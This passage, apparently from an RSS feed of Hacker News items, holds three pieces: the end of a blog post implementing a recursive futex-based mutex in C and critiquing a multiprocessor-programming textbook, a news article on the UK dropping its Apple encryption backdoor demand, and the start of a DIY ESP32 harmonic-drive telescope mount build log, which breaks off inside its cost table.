</span></span></code></pre></div><p>When the user unlocks a mutex, we will also need to check ownership. We’ll also need to distinguish between the case where we’re done nesting, and should actually unlock, and when we shouldn’t:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// Called when definitely holding the lock.
</span></span></span><span><span><span>// Returns true if we are nested, and false if we aren't (proper unlock).
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_nesting_check</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>pthread_equal</span>(<span>pthread_self</span>(), <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Thread is trying to unlock a lock it doesn't own.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>-</span><span>1</span>) <span>&gt;</span> <span>1</span>) {
</span></span><span><span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>	<span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, false);
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>}
</span></span></code></pre></div><p>The rest of the recursive lock implementation is then straightforward, given our previous locks:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_internal_try_lock</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock, <span>pthread_t</span> self)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>bool</span> result    <span>=</span>  <span>h4x0r_mutex_value_is_unlocked</span>(value);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (result) {
</span></span><span><span>	<span>h4x0r_mutex_recursive_new_ownership</span>(lock, self);
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> result;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_recursive_add_waiter</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_acquire</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>			      <span>struct</span> timespec         <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span>  expected;
</span></span><span><span>    <span>pthread_t</span> self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_check_ownership</span>(lock, self)) {
</span></span><span><span>	<span>// We already owned the lock, and incremented the nesting count.
</span></span></span><span><span><span></span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self)) {
</span></span><span><span>	    <span>// internal_try_lock will set up ownership.
</span></span></span><span><span><span></span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_recursive_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected)
</span></span><span><span>            <span>&amp;&amp;</span> <span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>int</span> err <span>=</span> <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)<span>&amp;</span>lock<span>-&gt;</span>futex,
</span></span><span><span>					    expected,
</span></span><span><span>					    timeout);
</span></span><span><span>	<span>if</span> (err <span>==</span> ETIMEDOUT) {
</span></span><span><span>	    <span>return</span> false;
</span></span><span><span>	}
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>futex);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_try_lock</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>pthread_t</span> self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_check_ownership</span>(lock, self)) {
</span></span><span><span>	<span>// We already owned the lock, and incremented the nesting count.
</span></span></span><span><span><span></span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>    <span>return</span> <span>h4x0r_mutex_recursive_internal_try_lock</span>(lock, self);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_release</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>h4x0r_mutex_recursive_nesting_check</span>(lock)) {
</span></span><span><span>	<span>// We were nested, and the decrement happened, so we're done.
</span></span></span><span><span><span></span>	<span>return</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>	<span>h4x0r_futex_wake</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, false);
</span></span><span><span>    }
</span></span><span><span>}
</span></span></code></pre></div><h2 id="remaining-issues">Remaining issues</h2><p>The core issue we have left is, what happens when a thread exits or dies when a mutex is locked??</p><p>It’s a bit much for us to cover today, but here’s a sketch of what we’d need to do:</p><ol><li>Each thread will need a private list of locks it is actively holding, which we would modify in the calls above.</li><li>In most thread APIs, we can register a callback when a thread exits (or is canceled). We’d need to register a handler for this, probably once per thread, when it’s launched.</li><li>That callback will need to go through the list and break any locks still held.</li><li>Many people won’t worry about crashed threads, as they often will crash the whole program. However, you can catch the signal a crash generates and keep the overall process from terminating. On Linux, you can compare your view of what threads are live with the OS’s view in <code>proc</code>. On other platforms, you might not be able to get the exact thread that crashed. However, if you’re managing threads that launch, you will probably have a way to give yourself visibility into what threads do not check in over a very short time.</li></ol><p>Another related issue comes up once you allow mutexes to span processes via memory shared across processes. The same basic code all works fine, modulo some changes to how to use a futex. Our problem is, what happens when a process holding a lock forks??</p><p>That’s also an issue you can handle if you’re managing all the locks. But if it’s a problem mentioned in the book– I can’t find it, after skimming over <em>31 uses</em> of the word <code>fork</code> (outside the context of cutlery🍴, which gets one use). Those uses are spread across a mere <em>9 pages</em>. Almost all of those uses are talking specifically about algorithms leveraging Java’s <code>ForkJoin</code> class, which is a thread pooling scheme within a process, not a proper posix <code>fork()</code>.</p><h2 id="reading--writing-_the-art--engineering-of-multiprocessor-programming_">Reading / Writing <em>The Art / Engineering of Multiprocessor Programming</em></h2><p>The book being named with the word “Art” is apt, because it’s not really engineering best practices.</p><p>To be fair, the book does mention that some locking primitives are lock-aware and some aren’t. It also shows how to build a recursive lock using a non-recursive lock (in Java, of course).</p><p>But it does so using a condition variable, which is horrible. If you just care about engineering best practices, you should have easy access to a reentrant mutex already (pthreads provides one). I’d expect that to be more performant than a condition variable, which already needs a mutex– it over-complicates the implementation.</p><p>If you’re trying to learn how things work under the hood, the condition variable isn’t giving you what you need to know. What you need to know is the <code>futex</code>, full stop.</p><p>Also, the book doesn’t seem to opine on recursive locks. It just shows them. I think the conventional wisdom on using them in mutexes is important to understand. And, I also think it becomes a different discussion if you’re talking about other concurrency primitives.</p><p>For instance, when using reader-writer locks (RW locks), I think recursive locks are really appropriate, just incredibly hard to get right.</p><p>If you’ve never used an RW lock, they allow any number of readers to lock for reading, all at the same time. If a writer is waiting to lock, it waits for all readers to clear (and in sane implementations, new readers cannot be added with a waiting writer).</p><p>But writers, once they do get the lock, get exclusive access, so they can edit without fear of readers seeing an inconsistent state.</p><p>In concept, that’s a great primitive to use for operations like dynamic lists. If there’s no mutation happening, but there could be lots of parallel reading, reads can end up pretty cheap, because they only have to stop for writes.</p><p>Consider an API call like:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>void</span> <span>h4x0r_list_append_all_contents</span>(<span>h4x0r_list_t</span> <span>*</span>dst, <span>h4x0r_list_t</span> <span>*</span>items);
</span></span></code></pre></div><p>The idea being, we’re going to combine the two lists by copying the contents of the <code>items</code> list onto the end of the <code>dst</code> list.</p><p>Now, we clearly want to grab a write lock on <code>dst</code>. And for <code>items</code>, we definitely want a read lock on that one.</p><p>But, what if we were given that API, and wanted to double a list, by doing:</p><p>I’ve seen APIs like this, where the same item is routinely passed through a nested set of construction operations that can mix reading and mutation. So you might need reads to nest, you might need writes to nest, all for the same item, in the same chain of calls.</p><p>We’d have no problems building an API that could handle such things in a program without concurrency, as long as we anticipate the need and fix the number of items to copy in before we start.</p><p>But in a multi-threaded app, if we don’t allow nested locks, we now also have to anticipate <em>every</em> situation where it might make sense for a list to be passed multiple times, and then add code to explicitly test for it.</p><p>So it’d be great to have solid semantics for RW lock nesting. But unfortunately, the POSIX standard leaves recursive locking as undefined behavior, which means that even if a conformant library provides such recursion, you definitely should not use it.</p><p>And in practice, behavior across common implementations is not remotely consistent. There’s a good reason why this was left undefined – it’s kind of hard. Since multiple threads can hold a lock, each thread must have a separate read nesting level.</p><p>And then how do you deal with writes that might be intermingled in there? How do you keep the accounting correct, so that you don’t drop write access too early, for instance?</p><p>These problems are solvable, though (and at some point soon, I’ll share my RW lock).</p><p>But in <em>The Art Of Multiprocessor Programming</em>, I can’t find any mention of such issues, neither warning you about the semantic challenges that can surprise you, nor showing how such things might be dealt with.</p><p>It’s not a surprise, since they don’t even mention the futex. Nor do they seem to cover async runtimes, despite their popularity (perhaps a bit more excusable since they’re generally multiplexing a single thread, but it still feels too important not to cover well).</p><h2 id="rtfc">RTFC</h2><p>The full source code is available <a href="https://codeberg.org/crashoverride/mutex">on codeberg</a>.</p><h2 id="-in-conclusion-">🏁 In conclusion 🏁</h2><p>I have plenty of other problems with this book, but they’d each probably need their own rant, and I’m not going to spend the time. But in short, this isn’t a Computer Science textbook, so much as it is a <em>history book</em>.</p><p>To other CS academics writing textbooks today, whether you’re focused on theory or practice, please make sure you at least <em>acknowledge</em> the important concepts that were around when you were <strong>writing the book!</strong></p><p>And ideally, make sure you cover some content from the current millennium.</p><p>If the only significant thing indicating the book was written (or edited) recently is the copyright date, consider that you might be doing a disservice with your book.</p><p>kthxbai,</p><p>Lee T, expert waiter 💁🏻‍♂️ (with the finest threads 🧵)</p></div></article></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK drops demand for backdoor into Apple encryption (249 pts)]]></title>
            <link>https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped</link>
            <guid>44950600</guid>
            <pubDate>Tue, 19 Aug 2025 11:58:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped">https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped</a>, See on <a href="https://news.ycombinator.com/item?id=44950600">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><a href="https://www.theverge.com/authors/jess-weatherbed"><img alt="Jess Weatherbed" data-chromatic="ignore" loading="lazy" width="36" height="36" decoding="async" data-nimg="1" srcset="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=48 1x, https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96 2x" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96"></a></p><div><p><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span id="follow-author-standard_article_details-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span></span><span>Jess Weatherbed</span></span></span></p> <p><span>is a news writer focused on creative industries, computing, and internet culture. Jess started her career at TechRadar, covering news and hardware reviews.</span></p></div></div><div id="zephr-anchor"><p>The United Kingdom will no longer force Apple to provide backdoor access to secure user data protected by the company’s iCloud encryption service, according to US Director of National Intelligence Tulsi Gabbard.</p><p>“Over the past few months, I’ve been working closely with our partners in the UK, alongside @POTUS and @VP, to ensure Americans’ private data remains private and our Constitutional rights and civil liberties are protected,” <a href="https://x.com/DNIGabbard/status/1957623737232007638">Gabbard posted to X on Monday</a>. “As a result, the UK has agreed to drop its mandate for Apple to provide a ‘back door’ that would have enabled access to the protected encrypted data of American citizens and encroached on our civil liberties.”</p><p>This announcement follows the UK <a href="https://www.theverge.com/news/608145/apple-uk-icloud-encrypted-backups-spying-snoopers-charter">issuing a secret order</a> in January this year, demanding Apple provide it with backdoor access to encrypted files uploaded by users worldwide. In response, Apple pulled the ability for new users in the UK to sign up to its <a href="https://www.theverge.com/news/617273/apple-removes-encryption-advanced-data-protection-adp-uk-spying-backdoor">Advanced Data Protection</a> (ADP) encrypted iCloud storage offering, and challenged the order, winning the right to publicly discuss the case in April. Earlier this year, US officials started examining whether the UK order had violated the bilateral CLOUD Act agreement, which bars the UK and US from issuing demands for each other’s data.</p><p>This pressure from the US <a href="https://www.theverge.com/news/710504/uk-apple-encryption-back-door-icloud-adp-backing-down">sparked reports last month</a> that Britain would walk back the demands it issued to Apple, with one unnamed UK official telling the <em>Financial Times</em> that the UK “had its back against the wall,” and was looking for a way out. While it’s unclear if the UK would negotiate new terms with Apple that avoid implicating the data of US citizens, an unnamed US official told <a href="https://www.ft.com/content/ab0aba27-81e0-4ee5-bcbb-6bce85386e40"><em>The Financial Times</em></a> that such negotiations would not be faithful to the new agreement.</p><p>With the order now reportedly removed, it’s unclear if Apple will restore access to its ADP service in the UK. We have reached out to Apple for comment. The UK Home Office has refused to comment on the situation.</p><div><p><span><strong>Follow topics and authors</strong> from this story to see more like this in your personalized homepage feed and to receive email updates.</span></p><ul><li id="follow-author-article_footer-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span><span>Jess Weatherbed</span></span></span></li><li></li><li></li><li></li><li></li><li></li></ul></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Custom telescope mount using harmonic drives and ESP32 (221 pts)]]></title>
            <link>https://www.svendewaerhert.com/blog/telescope-mount/</link>
            <guid>44949895</guid>
            <pubDate>Tue, 19 Aug 2025 09:46:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.svendewaerhert.com/blog/telescope-mount/">https://www.svendewaerhert.com/blog/telescope-mount/</a>, See on <a href="https://news.ycombinator.com/item?id=44949895">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong><a href="#manufacturing-and-assembly">TL;DR →</a></strong></p>
<h2 id="the-spark">The Spark</h2>
<div><figure><p><img alt="" loading="lazy" width="600" height="400" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-640.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-1200.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-1200.WEBP"></p><figcaption>Early Orion Nebula capture</figcaption></figure></div>
<p>A few years back, I developed an interest in astrophotography thanks to YouTubers like <a href="https://www.youtube.com/c/nebulaphotos">Nebula Photos</a>. Armed with an OM System OM-5 and a 15-140mm Olympus lens, I managed some decent shots of the Orion Nebula from a tripod by taking 300 pictures with a 2-second exposure time and stacking them in <a href="https://siril.org/">Siril</a>.</p>
<p>Knowing I could achieve better results with tracking, I bought a Move Shoot Move tracker for around €200. It delivered longer exposures, but finding targets and achieving proper polar alignment remained challenging. I spent countless hours researching proper telescope mounts with GOTO and tracking capabilities, coming close to pulling the trigger on units ranging from €1,200 to €4,000. For a hobby I was still exploring, that investment always felt like a leap too far.</p>
<h2 id="the-pcb-awakening">The PCB Awakening</h2>
<p>Late 2024 I randomly came across this <a href="https://www.youtube.com/watch?v=EPH23zhPg50">YouTube video about custom PCB design</a> in my feed, and I was hooked immediately.</p>
<p>With a decent collection of microcontroller boards, the idea of ditching messy breadboards for clean, custom, affordable PCBs was revelatory. My first project replaced my home thermostat with an ESP32-based design with e-paper display, interlocking finger patterns for the original carbon rubber dome switches and space for a Bosch BME680 sensor breakout.</p>
<p>After completing that project, I revisited the telescope mount idea - this time armed with newfound PCB design skills. The question emerged: "How hard can it be?"</p>
<h2 id="down-the-research-rabbit-hole">Down the Research Rabbit Hole</h2>
<p>The plan crystallized around harmonic drives (strain wave gears) - the favorite of modern telescope mounts for their excellent performance in compact packages. The concept seemed straightforward: motor, microcontroller, optional gearing, and a strain wave gear, all housed in a sturdy enclosure.</p>
<p>I divided my time between scouring AliExpress for components and studying existing DIY builds. AliExpress proved to have the worst search functionality in e-commerce history. Google's <code>site:aliexpress.com</code> became my most reliable tool. Hours were spent analyzing technical drawings of every available harmonic drive, searching for workable options and trying to not lose my mind in the myriad of near-identical items from multiple vendors.</p>
<p>Some other DIY projects provided me with invaluable information:</p>
<ul>
<li><a href="https://github.com/polvinc/HEMY">HEMY</a> - Harmonic drive equatorial mount</li>
<li><a href="https://github.com/romanhujer/HrEM">HrEM</a> - Harmonic reduction equatorial mount</li>
<li><a href="https://github.com/polvinc/DHEM">DHEM</a> - Dual harmonic equatorial mount</li>
<li><a href="https://astrophilos.com/diy-eq-mount-v2/">DIY EQ Mount V2</a> - Comprehensive build guide</li>
</ul>
<p>Soon I was looking into the workings of stepper motors, BLDC motors, Field Oriented Control (FOC), and various open source FOC implementations like <a href="https://simplefoc.com/">SimpleFOC</a>.</p>
<h2 id="design-decisions">Design Decisions</h2>
<p>Honestly, this build didn't require a custom PCB. A FYSETC E4 board or even a breadboarded ESP32 would have worked. But I wanted to create something beautiful from scratch, achieving that "I made this" feeling. The housing, however, absolutely needed to be sturdy and custom-designed.</p>
<p>I started learning <a href="https://www.freecad.org/">FreeCAD</a> alongside <a href="https://www.kicad.org/">KiCad</a>, producing about eight throwaway housing designs before the concept solidified.</p>
<p><img alt="FreeCAD Design" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-1920.WEBP">
<em>Housing design iterations in FreeCAD - multiple attempts to get the geometry right</em></p>
<h3 id="the-architecture">The Architecture</h3>
<ul>
<li><strong>RA Axis</strong>: 42AIM15 Servo motor with Type 17 harmonic drive (100:1 reduction)</li>
<li><strong>DEC Axis</strong>: MKS Servo042D stepper with Type 14 harmonic drive (100:1 reduction)</li>
<li><strong>Mounting</strong>: Arca Swiss plate (compatible with existing Move Shoot Move wedge)</li>
<li><strong>Operation</strong>: GEM or ALTAZ modes</li>
<li><strong>Microcontroller</strong>: ESP32-S3</li>
<li><strong>Power</strong>: USB-C power delivery up to 24V/4A</li>
<li><strong>Motor driving</strong>: step/dir/en ports via the ULN2003 + MODBUS and CANBUS ports</li>
<li><strong>Extra</strong>: Leftover GPIO pins broken out for future use</li>
</ul>
<p>The 42AIM15 provides 32,768 steps per revolution, configurable to 65,536 steps with 2x oversampling. The MKS Servo042D supports microstepping up to 1/256. Both motors were chosen for their integrated drivers, dramatically simplifying PCB design. With FOC and microstepping, other builds demonstrated decent tracking accuracy without intermediate reduction. Via CANBUS I can control the microstepping regime of the stepper motor. During slews I set the microstepping to 128 from 256, allowing a higher slew speed in degrees / second without putting too much load on the microprocessor.</p>
<h2 id="the-pcb-design">The PCB Design</h2>
<p><img alt="KiCad PCB Design" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-1920.WEBP">
<em>PCB layout in KiCad showing the semi-circular form factor and component placement</em></p>
<p>The PCB takes a semi-circular form factor, designed to fit snugly within the housing. This unique shape and placement didn't significantly increase the size of the mount, which I already felt was becoming quite beefy. I used an ESP32-S3 Microcontroller without the PCB antenna, so I could fit the module anywhere on the board. The first traces I routed were power and the USB differential pair. I managed to place the microcontroller in such a way that the differential pair goes in a straight line.</p>
<p>Power is available through USB-C thanks to the AP33772 IC which negotiates power via the CC pins on the USB-C connector. Power banks supporting USB PD 3.0 and able to deliver 12V are excellent for making this entire setup portable. Major props to the guys from CentyLab for their <a href="https://github.com/CentyLab/PicoPD">PicoPD</a> schematics and PCB designs using the AP33772. This was a big inspiration for laying out my components. The output trace is very wide to support 24V and also has 4 large capacitors. In hindsight, those caps were maybe a bit overkill because the motors for this usecase hardly produce any sudden power peaks, and a good USB PD power supply would probably already have a decent enough amount of capacitance.</p>
<p>During my research I noticed a lot of integrated motors with CANBUS/MODBUS features, so I added functionality for that as well. The remaining GPIO pins of the ESP32 I simply routed somewhere nearer to the edge of the board so they can be used for other purposes in the future.</p>
<p>Some thought has also gone into choosing the right PCB mounted connectors. I settled on the JST PH series for their compactness and their ability to carry 2A per pin. Matt Millman's <a href="https://www.mattmillman.com/info/crimpconnectors/common-jst-connector-types/">Common JST Connector Types</a> was a great resource for making the final selection.</p>
<h3 id="the-first-pcb-mistake">The First PCB Mistake</h3>
<p>Initially my design was around the AP33772S IC. A last-minute component substitution at JLCPCB - changing the originally specified IC due to stock issues - should have triggered a complete pin compatibility review. Impatience won, and I ordered anyway, replacing the AP33772S with the AP33772.</p>
<p>The result: I2C communication was impossible due to NO-CONNECT pins erroneously tied to ground, and manually getting the VBUS voltage to 24V using an external PD trigger board caused a sudden tiny hole to appear on the chip package, followed by blue smoke. Lesson learned. Version 2 underwent exhaustive verification, and worked flawlessly when it arrived. I also included significantly more test points throughout the board, whch is a practice I'm going to keep going forward. The version 1 boards still work for controlling the mount, but they lack the intergated power delivery.</p>
<p><img alt="Completed PCB" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/pcb-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/pcb-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/pcb-opt-1920.WEBP">
<em>Version 2 of the custom PCB</em></p>
<h2 id="onstepx-integration">OnStepX Integration</h2>
<p><a href="https://github.com/hjd1964/OnStepX">OnStepX</a> is telescope mount firmware supporting multiple microcontroller platforms, originally developed by Howard Dutton to save his mount from obsolescence. It has since grown into a major open source project with substantial community support.</p>
<p>Without OnStepX, DIY telescope mounts like this wouldn't be feasible for many builders. The ESP32 WiFi support became my preferred communication method, though initial testing revealed WiFi instability during slewing operations. Not surprising once you understand that slewing to a target significantly increases the number of pulses per second sent to the motors, and everything became just too much to handle for our little ESP32.</p>
<p>Two changes resolved the stability issues:</p>
<ol>
<li>Reducing slew rates or increasing step sizes with lower microstep divisions (configurable on-the-fly through OnStepX hooks in the generic motor class)</li>
<li>Configuring the device as a WiFi client rather than access point</li>
</ol>
<p>Apart from adding a custom pin layout file and some code to lower the microstep subdivisions during slewing, OnStepX really just worked out of the box.</p>
<h2 id="manufacturing-and-assembly">Manufacturing and Assembly</h2>
<p>All manufacturing was handled by JLCPCB - both PCB fabrication and CNC machining. Sending CNC production files without 3D printing prototypes first was a calculated gamble that paid off; everything fit (almost) perfectly upon arrival.</p>
<p><img alt="Assembly Process" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-1920.WEBP">
<em>Mount fully assembled. Yes, those are 5 euro rainwater pipe clamps holding the telescope</em></p>
<p>One minor adjustment was required: the red cap at the RA axis rubbed against the harmonic drive. The oversight occurred because I modeled the cup interior without accounting for the harmonic drive mounting screws. I used a simple spacer to fix the problem. I'm very impressed with the manufacturing quality of the components. To assemble everything I just needed to thread the holes with some M3 or M4 taps and bolt everything together. I opted for manual tapping to save on manufacturing cost.</p>
<h2 id="real-world-performance">Real-World Performance</h2>
<p>Countless nights were spent mastering polar alignment, scope setup, and navigating the quirks of <a href="https://kde.org/applications/education/org.kde.kstars/">KStars</a>, <a href="https://docs.kde.org/trunk5/en/kstars/kstars/ekos.html">Ekos</a>, and <a href="https://indilib.org/">INDI server</a>. The first cloudless nights usually ended in frustration: between polar alignment, WiFi issues, indi server issues, camera issues, slipping motor couplings, and software configuration, dawn would arrive before I captured a single frame. At one point, I celebrated achieving 0.1 arcsecond precision! - only to discover <a href="https://openphdguiding.org/">PHD2</a> was configured with incorrect focal length settings and reported skewed results.</p>
<p>The best verified precision achieved so far is 1-2 arcseconds observed with PHD2, more than adequate for 30-second exposures with a 600mm focal length Sigma lens. I continue using my camera in interval mode, ensuring the signal is somewhere in the middle of the histogram. ISO 3200 usually, with sensor stabilization and noise suppression disabled. Stacking is performed in <a href="https://siril.org/">Siril</a>, though multi-night stacking remains a goal requiring significant planning, luck, and consistency.</p>
<p><img alt="Telescope Mount in Action" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-7-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-7-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-7-opt-1920.WEBP">
<em>The completed mount setup</em></p>
<h2 id="the-economics">The Economics</h2>
<p>Total project cost reached approximately €1,700, including reusable tools like thread taps, various M3/M4/M5 hardware and JST Connector tools. Sometimes bulk purchases or shipping minimums inflated costs. I also bought 2x unused MS6010v3 motors for experimenting/evaluating for a potential future super compact build. And the extra cost of the PCB revision ofcourse.</p>
<p>Calculating single-unit costs yields approximately €800, with potential for reduction in larger quantities. Compared to commercial GOTO mounts in the €1,200-€4,000 range, the economics are competitive - but economics was never the primary driver.</p>
<h3 id="detailed-cost-breakdown">Detailed Cost Breakdown</h3>
<table><thead><tr><th>Component</th><th>Category</th><th>Total Cost (€)</th><th>Single Unit (€)</th></tr></thead><tbody><tr><td>Cuttin Tap 1/4-20 UNC</td><td>Tools</td><td>2.89</td><td>1</td></tr><tr><td>Cutting Tap Form D - UNC 3/8 x 16</td><td>Tools</td><td>12.88</td><td>1</td></tr><tr><td>220 pieces M5 screw set</td><td>Tools</td><td>10.59</td><td>1</td></tr><tr><td>440 pieces M4 screw set</td><td>Tools</td><td>13.21</td><td>1</td></tr><tr><td>440 pieces M3 screw set</td><td>Tools</td><td>9.14</td><td>1</td></tr><tr><td>Metric tap set MetricssMann M53250-B</td><td>Tools</td><td>27.38</td><td>1</td></tr><tr><td>PEBA JST PH 2.0 Crimping set</td><td>Tools</td><td>31.11</td><td>1</td></tr><tr><td><strong>Tools Subtotal</strong></td><td></td><td><strong>107.2</strong></td><td></td></tr><tr><td>MKS SERVO42D NEMA17 Closed Loop Stepper Motor</td><td>Mount</td><td>73.2</td><td>36.6</td></tr><tr><td>Harmonic drive 2x</td><td>Mount</td><td>144.44</td><td>144</td></tr><tr><td>Import tax harmonic drive 2x</td><td>Mount</td><td>30.24</td><td>100</td></tr><tr><td>Servo motor 2x</td><td>Mount</td><td>216.46</td><td>151.7</td></tr><tr><td>Import tax servo motor x2</td><td>Mount</td><td>86.94</td><td></td></tr><tr><td>MS6010v3 (2x)</td><td>Research</td><td>216.94</td><td></td></tr><tr><td>Import tax MS6010v3 